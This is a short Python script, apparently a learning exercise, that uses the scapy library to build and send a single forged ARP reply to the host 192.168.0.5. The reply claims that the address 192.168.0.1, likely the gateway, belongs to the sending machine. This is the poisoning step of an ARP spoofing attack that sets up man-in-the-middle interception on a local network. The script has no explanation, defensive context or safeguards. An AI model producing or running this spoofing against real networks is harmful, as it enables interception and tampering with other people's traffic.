import scapy.all as scapy

packet = scapy.ARP(op=2, pdst="192.168.0.5", hwdst="78:c5:f8:d1:56:3f", psrc="192.168.0.1")
scapy.send(packet)
